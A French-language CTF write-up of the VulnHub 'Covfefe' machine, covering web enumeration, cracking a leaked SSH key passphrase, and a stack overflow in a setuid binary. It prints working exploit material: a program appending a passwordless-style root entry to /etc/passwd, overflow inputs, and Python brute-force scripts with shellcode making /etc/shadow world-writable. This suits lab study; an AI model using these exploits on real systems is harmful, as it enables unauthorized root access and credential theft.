---
title: "Solution du CTF Covfefe de VulnHub"
tags: [CTF, VulnHub]
---

[covfefe](https://vulnhub.com/entry/covfefe-1,199/) est un CTF qui m'a donné une impression de déjà vu. J'avais déjà dû le résoudre sans écrire de writeup. C'est maintenant chose faite.

## 100% covfefe

On trouve ici deux serveurs webs dont un sur le port 31337 :

```
Nmap scan report for 192.168.56.195
Host is up (0.000062s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10 (protocol 2.0)
80/tcp    open  http    nginx 1.10.3
31337/tcp open  http    Werkzeug httpd 0.11.15 (Python 3.5.3)
| vulners: 
|   cpe:/a:python:python:3.5.3: 
|       SSV:92725       7.5     https://vulners.com/seebug/SSV:92725    *EXPLOIT*
|       PACKETSTORM:141350      7.5     https://vulners.com/packetstorm/PACKETSTORM:141350      *EXPLOIT*
|       CVE-2020-27619  7.5     https://vulners.com/cve/CVE-2020-27619
|       CVE-2017-1000158        7.5     https://vulners.com/cve/CVE-2017-1000158
|       CVE-2016-9063   7.5     https://vulners.com/cve/CVE-2016-9063
|       CVE-2016-0718   7.5     https://vulners.com/cve/CVE-2016-0718
|       1337DAY-ID-27146        7.5     https://vulners.com/zdt/1337DAY-ID-27146        *EXPLOIT*
|       CVE-2020-8492   7.1     https://vulners.com/cve/CVE-2020-8492
--- snip ---
|       CVE-2016-2183   5.0     https://vulners.com/cve/CVE-2016-2183
|       0C076F95-ABB2-53E1-9E25-F7D1A5A9B3A1    5.0     https://vulners.com/githubexploit/0C076F95-ABB2-53E1-9E25-F7D1A5A9B3A1  *EXPLOIT*
|       CVE-2020-14422  4.3     https://vulners.com/cve/CVE-2020-14422
|       CVE-2019-9947   4.3     https://vulners.com/cve/CVE-2019-9947
|       CVE-2019-9740   4.3     https://vulners.com/cve/CVE-2019-9740
|       CVE-2019-18348  4.3     https://vulners.com/cve/CVE-2019-18348
|       CVE-2019-16935  4.3     https://vulners.com/cve/CVE-2019-16935
|       CVE-2023-27043  0.0     https://vulners.com/cve/CVE-2023-27043
|       CVE-2023-24329  0.0     https://vulners.com/cve/CVE-2023-24329
|_      CVE-2021-28861  0.0     https://vulners.com/cve/CVE-2021-28861
```

Une énumération avec `feroxbuster` remonte rapidement des noms de fichiers qui laissent supposer qu'on est dans le dossier personnel d'un utilisateur :

```
200        1l        3w       43c http://192.168.56.195:31337/.ssh
301        4l       24w      275c http://192.168.56.195:31337/taxes
200      113l      483w     3526c http://192.168.56.195:31337/.bashrc
200        7l       35w      220c http://192.168.56.195:31337/.bash_logout
200        2l        2w       19c http://192.168.56.195:31337/.bash_history
200       22l      109w      675c http://192.168.56.195:31337/.profile
```

Si on demande un dossier (sans slash final) alors on obtient un listing sous la forme d'une liste JSON :

```console
$ curl http://192.168.56.195:31337/.ssh
['id_rsa', 'authorized_keys', 'id_rsa.pub']
```

La clé privée `id_rsa` est récupérable. Cette dernière étant protégée par une passphrase, j'utilise `ssh2john` pour en extraire un hash que je casse ensuite :

```console
$ python3 ssh2john.py id_rsa > /tmp/hashes.txt
$ john --wordlit=wordlists/rockyou.txt /tmp/hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
starwars         (id_rsa)
```

Il nous reste à rouver le nom d'utilisateur correspondant à cette clé et cela peut s'obtenir en lisant la fin de la clé publique (`id_rsa.pub`) : `simon@covfefe`

Une fois connecté avec la clé et la passphrase on ne découvre pas grand-chose de plus :

```console
simon@covfefe:~$ id
uid=1000(simon) gid=1000(simon) groups=1000(simon),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
simon@covfefe:~$ ls -al
total 36
drwxr-xr-x 3 simon simon 4096 Jul  9  2017 .
drwxr-xr-x 3 root  root  4096 Jun 28  2017 ..
-rw------- 1 simon simon   19 Jun 28  2017 .bash_history
-rw-r--r-- 1 simon simon  220 Jun 28  2017 .bash_logout
-rw-r--r-- 1 simon simon 3526 Jun 28  2017 .bashrc
-rwxr-xr-x 1 simon simon  449 Jul  9  2017 http_server.py
-rw-r--r-- 1 simon simon  675 Jun 28  2017 .profile
-rw-r--r-- 1 simon simon   70 Jul  9  2017 robots.txt
drwx------ 2 simon simon 4096 Jun 28  2017 .ssh
```

Le script Python correspond à l'appli Flask qui tournait sur le port 31337 :

```python
#!/usr/bin/env python3

from flask import Flask
from os import environ, listdir

root = environ['HOME']
sauce = '/.ssh'

app = Flask(__name__, static_folder=root, static_url_path='')

@app.route(sauce)
def sauce_content():
    return str(listdir(root + sauce)), 200

@app.route('/taxes/')
def taxes_content():
    return 'Good job! Here is a flag: flag1{make_america_great_again}'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=31337)
```

En revanche une recherche sur les binaires setuid révèle un fichier inhabituel :

```console
simon@covfefe:~$ find / -type f -perm -u+s -ls 2> /dev/null 
   261713     40 -rwsr-xr-x   1 root     root        39632 May 17  2017 /usr/bin/chsh
   261716     60 -rwsr-xr-x   1 root     root        57972 May 17  2017 /usr/bin/passwd
   261712     48 -rwsr-xr-x   1 root     root        48560 May 17  2017 /usr/bin/chfn
   261715     80 -rwsr-xr-x   1 root     root        78340 May 17  2017 /usr/bin/gpasswd
   264578     36 -rwsr-xr-x   1 root     root        34920 May 17  2017 /usr/bin/newgrp
   271967     48 -rwsr-xr--   1 root     messagebus    46436 Apr  6  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   393292      8 -rwsr-xr-x   1 root     root           5480 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   274840    516 -rwsr-xr-x   1 root     root         525932 Mar 30  2017 /usr/lib/openssh/ssh-keysign
   275776      8 -rwsr-xr-x   1 root     staff          7608 Jul  2  2017 /usr/local/bin/read_message
   131146     28 -rwsr-xr-x   1 root     root          26504 Mar 22  2017 /bin/umount
   131130     40 -rwsr-xr-x   1 root     root          39144 May 17  2017 /bin/su
   131145     40 -rwsr-xr-x   1 root     root          38940 Mar 22  2017 /bin/mount
   131809     68 -rwsr-xr-x   1 root     root          68076 Nov 10  2016 /bin/ping
```

Le programme semble attendre un nom en particulier et si le bon est donné il affiche le contenu d'un fichier texte :

```console
simon@covfefe:~$ /usr/local/bin/read_message
What is your name?
devloop
Sorry devloop, you're not Simon! The Internet Police have been informed of this violation.
simon@covfefe:~$ /usr/local/bin/read_message
What is your name?
Simon
Hello Simon! Here is your message:

Hi Simon, I hope you like our private messaging system.

I'm really happy with how it worked out!

If you're interested in how it works, I've left a copy of the source code in my home directory.

- Charlie Root
```

On dispose de la source du programme dans `/root` qui est lisible :

```c
simon@covfefe:~$ cat /root/read_message.c 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// You're getting close! Here's another flag:
// flag2{use_the_source_luke}

int main(int argc, char *argv[]) {
    char program[] = "/usr/local/sbin/message";
    char buf[20];
    char authorized[] = "Simon";

    printf("What is your name?\n");
    gets(buf);

    // Only compare first five chars to save precious cycles:
    if (!strncmp(authorized, buf, 5)) {
        printf("Hello %s! Here is your message:\n\n", buf);
        // This is safe as the user can't mess with the binary location:
        execve(program, NULL, NULL);
    } else {
        printf("Sorry %s, you're not %s! The Internet Police have been informed of this violation.\n", buf, authorized);
        exit(EXIT_FAILURE);
    }

}
```

## My name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

On voit que le buffer lut (`buf`) est vulnérable à un stack overflow (fonction `gets`). Par conséquent, si les variables sont alignées à notre avantage on sera en mesure d'écraser la chaine `program` et donc de faire exécuter le programme de notre choix.

Point important : le binaire et le système sont en 32 bits, NX et Canary sont désactivés sur l'exécutable MAIS la stack est randomisée et PIC est présent.

L'inconvénient avec PIC/PIE ([Position-independent code](https://en.wikipedia.org/wiki/Position-independent_code)) c'est que les adresses du code changent à chaque exécution. On peut s'en rendre compte en copiant le binaire (sinon on ne peut pas accéder aux informations de mapping) puis en l'exécutant plein de fois :

```console
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
80090000-80091000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
8000b000-8000c000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
800ee000-800ef000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
80074000-80075000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
80018000-80019000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
80075000-80076000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
80004000-80005000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
80024000-80025000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
800f0000-800f1000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
800f6000-800f7000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
8003f000-80040000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
800a8000-800a9000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
800e2000-800e3000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
80077000-80078000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
8003b000-8003c000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
800b3000-800b4000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
80017000-80018000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
80076000-80077000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
simon@covfefe:~$ cat /proc/`pidof read_message`/maps | head -1
80002000-80003000 r-xp 00000000 08:01 132648     /tmp/local/bin/read_message
```

J'avais trouvé un gadget bien sympathique à l'offset `0x550` dans le binaire pour sauter sur `esp` mais ce dernier semble inutilisable avec l'adresse de base qui change à chaque fois.

```nasm
gdb-peda$ x/5i 0x56555000+0x550
   0x56555550 <_start+48>:      push   esp
   0x56555552 <_start+50>:      mov    ebx,DWORD PTR [esp]
   0x56555555 <_start+53>:      ret
```

On revient sur l'exploitation mentionnée plus tôt et on a bien `program` à `ebp-0x20` et le buffer lut à `ebp-0x34` par conséquent on peut bien écraser `program`.

```nasm
int main (int argc, char **argv, char **envp);
; var const char *s1 @ stack - 0x3a
; var int32_t var_36h @ stack - 0x36
; var char *s2 @ stack - 0x34
; var int32_t var_20h @ stack - 0x20
; var int32_t var_1ch @ stack - 0x1c
; var int32_t var_18h @ stack - 0x18
; var int32_t var_14h @ stack - 0x14
; var int32_t var_10h @ stack - 0x10
; var int32_t var_ch @ stack - 0xc
; var int32_t var_8h @ stack - 0x8
0x00000690      push    ebp
0x00000691      mov     ebp, esp
0x00000693      push    ebx
0x00000694      sub     esp, 0x34
0x00000697      call    __x86.get_pc_thunk.bx ; sym.__x86.get_pc_thunk.bx
0x0000069c      add     ebx, 0x1964
0x000006a2      mov     dword [var_20h], 0x7273752f ; '/usr'
0x000006a9      mov     dword [var_1ch], 0x636f6c2f ; '/loc'
0x000006b0      mov     dword [var_18h], 0x732f6c61 ; 'al/s'
0x000006b7      mov     dword [var_14h], 0x2f6e6962 ; 'bin/'
0x000006be      mov     dword [var_10h], 0x7373656d ; 'mess'
0x000006c5      mov     dword [var_ch], 0x656761 ; 'age'
0x000006cc      mov     dword [s1], 0x6f6d6953 ; 'Simo'
0x000006d3      mov     word [var_36h], 0x6e ; 'n'
0x000006d9      lea     eax, [ebx - 0x1820]
0x000006df      push    eax        ; const char *s
0x000006e0      call    puts       ; sym.imp.puts ; int puts(const char *s)
0x000006e5      add     esp, 4
0x000006e8      lea     eax, [s2]
0x000006eb      push    eax        ; char *s
0x000006ec      call    gets       ; sym.imp.gets ; char *gets(char *s)
0x000006f1      add     esp, 4
0x000006f4      push    5          ; size_t n
0x000006f6      lea     eax, [s2]
0x000006f9      push    eax        ; const char *s2
0x000006fa      lea     eax, [s1]
0x000006fd      push    eax        ; const char *s1
0x000006fe      call    strncmp    ; sym.imp.strncmp ; int strncmp(const char *s1, const char *s2, size_t n)
0x00000703      add     esp, 0xc
0x00000706      test    eax, eax
0x00000708      jne     0x72f
0x0000070a      lea     eax, [s2]
0x0000070d      push    eax
0x0000070e      lea     eax, [ebx - 0x180c]
0x00000714      push    eax        ; const char *format
0x00000715      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x0000071a      add     esp, 8
0x0000071d      push    0
0x0000071f      push    0
0x00000721      lea     eax, [var_20h]
0x00000724      push    eax
0x00000725      call    execve     ; sym.imp.execve
0x0000072a      add     esp, 0xc
0x0000072d      jmp     0x74d
0x0000072f      lea     eax, [s1]
0x00000732      push    eax
0x00000733      lea     eax, [s2]
0x00000736      push    eax
0x00000737      lea     eax, [ebx - 0x17e8]
0x0000073d      push    eax        ; const char *format
0x0000073e      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x00000743      add     esp, 0xc
0x00000746      push    1          ; int status
0x00000748      call    exit       ; sym.imp.exit ; void exit(int status)
0x0000074d      mov     eax, 0
0x00000752      mov     ebx, dword [var_8h]
0x00000755      leave
0x00000756      ret
```

La fonction de lecture `gets` stoppe quand elle croise un retour à la ligne ou EOF mais accepte la présence d'octets nuls. J'en ai inclus un dans mon buffer, mais ce n'est pas nécessaire, car `strncmp` est appelé avec la taille du nom attendu (`Simon` soit la taille 5).

Lors de l'exploitation le programme appelé semblait ne plus récupérer l'effective UID à 0 donc il était sans doute dropé par bash comme c'était le cas pour le [CTF SmashTheTux]({% link _posts/2023-02-12-Solution-du-CTF-SmashTheTux.md %}).

J'ai repris la technique utilisée précédemment qui consiste à écrire dans `/etc/passwd` au lieu de tenter de lancer un shell :

```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>

int main(void) {
  FILE * fd;
  fd = fopen("/etc/passwd", "a");
  fputs("devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh\n", fd);
  fclose(fd);
}
```

Une fois le binaire compilé sur ma machine (`gcc -o getroot -static -m32 getroot.c`) et déposé sur la VM je peux procéder à l'exploitation :

```console
simon@covfefe:~$ echo -e "Simon\0///////////////////tmp/getroot" | /usr/local/bin/read_message
What is your name?
Hello Simon! Here is your message:

simon@covfefe:~$ tail /etc/passwd
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
simon:x:1000:1000:,,,:/home/simon:/bin/bash
messagebus:x:105:109::/var/run/dbus:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh
simon@covfefe:~$ su devloop
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
flag.txt  read_message.c
# cat flag.txt
You did it! Congratulations, here's the final flag:
flag3{das_bof_meister}
```

## Mieux qu'au loto

En théorie, comme on est sur du 32 bits, on peut tenter de brute forcer les adresses. Sur cette VM la désactivation de l'ASLR avec `ulimit -s unlimited` a été patchée donc le brute force est notre seul recours.

Sachant que l'adresse de retour de la fonction `main` est présente à l'offset 46 j'ai écrit ce code qui tente l'exploitation en boucle en espérant que l'adresse de base corresponde à un cas d'exécution du binaire, auquel cas, on saute sur le gadget vu plus tôt et on arrive sur notre shellcode (avec NX désactivé) :

```python
import os
from stat import S_IWOTH
from struct import pack

shellcode = (
    b"\x6a\x0f"               #  push $0xf
    b"\x58"                   #  pop %eax
    b"\x31\xc9"               #  xor %ecx,%ecx
    b"\x51"                   #  push %ecx
    b"\x66\xb9\xb6\x01"       #  mov $0x1b6,%cx
    b"\x68\x61\x64\x6f\x77"   #  push $0x776f6461
    b"\x68\x63\x2f\x73\x68"   #  push $0x68732f63
    b"\x68\x2f\x2f\x65\x74"   #  push $0x74652f2f
    b"\x89\xe3"               #  mov %esp,%ebx
    b"\xcd\x80"               #  int $0x80
    b"\x40"                   #  inc %eax
    b"\xcd\x80"               #  int $0x80
)

jmp_to_esp = 0x80024000 + 0x550
offset = 46

buffer = b"Simon\0" + b"A" * offset + pack("<I", jmp_to_esp) + shellcode + b"\n"
with open("input.raw", "wb") as fd:
    fd.write(buffer)

count = 0
while True:
        os.system("/usr/local/bin/read_message < input.raw >/dev/null 2>&1")
        count += 1
        if os.stat("/etc/shadow").st_mode & S_IWOTH:
                os.system("ls -al /etc/shadow")
                print("Success after", count, "attempts")
                exit()
```

L'exploitation réussie rapidement. À noter que par défaut la VM est configurée pour n'utiliser que 256Mo de mémoire, ce qui facilite peu être notre tache.

```console
simon@covfefe:~$ python3 exploit.py 
-rw-rw-rw- 1 root shadow 931 Jun 28  2017 /etc/shadow
Success after 66 attempts
```

L'autre technique d'exploitation consiste à placer de nombreux shellcodes avec plein de NOPs dans des variables d'environnement et donner une adresse de la stack comme adresse de retour :

```python
import os
import string
from stat import S_IWOTH
from struct import pack

shellcode = (
    "\x6a\x0f"               #  push $0xf
    "\x58"                   #  pop %eax
    "\x31\xc9"               #  xor %ecx,%ecx
    "\x51"                   #  push %ecx
    "\x66\xb9\xb6\x01"       #  mov $0x1b6,%cx
    "\x68\x61\x64\x6f\x77"   #  push $0x776f6461
    "\x68\x63\x2f\x73\x68"   #  push $0x68732f63
    "\x68\x2f\x2f\x65\x74"   #  push $0x74652f2f
    "\x89\xe3"               #  mov %esp,%ebx
    "\xcd\x80"               #  int $0x80
    "\x40"                   #  inc %eax
    "\xcd\x80"               #  int $0x80
)


for letter in string.ascii_letters:
        os.environ[letter] = "\x90" * 500000 + shellcode

print("Memory filled, bruteforcing...")

stack_address = 0xbf802000
offset = 46
count = 0

while True:
        count += 1
        print("attempt", count)
        for i in range(-100000000, 100000000, 250000):
                buffer = b"Simon\0" + b"A" * offset + pack("<I", stack_address + i) + b"\n"
                with open("input2.raw", "wb") as fd:
                    fd.write(buffer)

                os.system("/usr/local/bin/read_message < input2.raw >/dev/null 2>&1")
                if os.stat("/etc/shadow").st_mode & S_IWOTH:
                        os.system("ls -al /etc/shadow")
                        print("Success after", count, "attempts")
                        exit()
```

Avec cette version, je ne suis pas parvenu à obtenir l'exécution du shellcode.
